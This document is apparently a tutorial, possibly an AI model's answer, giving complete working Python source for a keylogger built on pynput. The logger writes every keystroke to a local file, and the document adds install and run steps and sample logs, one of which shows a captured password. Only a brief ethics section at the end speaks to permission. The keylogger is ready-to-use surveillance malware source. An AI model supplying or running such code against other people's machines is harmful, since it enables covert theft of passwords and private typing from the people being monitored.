Below is a Python script for a *Simple Keylogger* using the pynput library to capture keystrokes and save them to a file.

### *Python Code for Keylogger*

python
from pynput import keyboard

# The file where keystrokes will be logged
log_file = "key_log.txt"

# Function to write keystrokes to file
def write_to_file(key):
    with open(log_file, "a") as file:
        try:
            # Remove quotes from key string
            file.write(str(key.char))
        except AttributeError:
            # For special keys (like Enter, Space, etc.), write the key name
            file.write(f'[{key}]')

# Function to handle key press events
def on_press(key):
    write_to_file(key)

# Function to handle key release events (optional)
def on_release(key):
    # Stop the keylogger if Esc is pressed
    if key == keyboard.Key.esc:
        return False

# Start listening for keystrokes
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()


### *How to Run the Code*
1. Install the required library:
   
   bash
   pip install pynput
   

2. Run the Python script:
   
   bash
   python keylogger.py
   

3. The script will start recording keystrokes and save them to a file called key_log.txt. Press the Esc key to stop the keylogger.

### *Sample Inputs and Outputs*

#### *Input Example 1*
- User Types: HelloWorld123
- User presses: Enter and then Esc to stop the logger.

**Content of key_log.txt**:

HelloWorld123[Key.enter]


#### *Input Example 2*
- User Types: password123!
- User presses: Space, Tab, Backspace, and then Esc to stop the logger.

**Content of key_log.txt**:

password123![Key.space][Key.tab][Key.backspace]


#### *Input Example 3*
- User Types: Python3_is#1!
- User presses: Esc to stop the logger.

**Content of key_log.txt**:

Python3_is#1!


### *Ethical Considerations*
- *Permission*: Only use this code with explicit permission from the system owner. Unauthorized keylogging can be illegal and unethical.
- *Transparency*: Always inform users that their keystrokes are being recorded if you have a legitimate reason to use a keylogger (e.g., for personal testing or educational purposes).
- *Confidentiality*: Handle collected data securely and respect privacy.
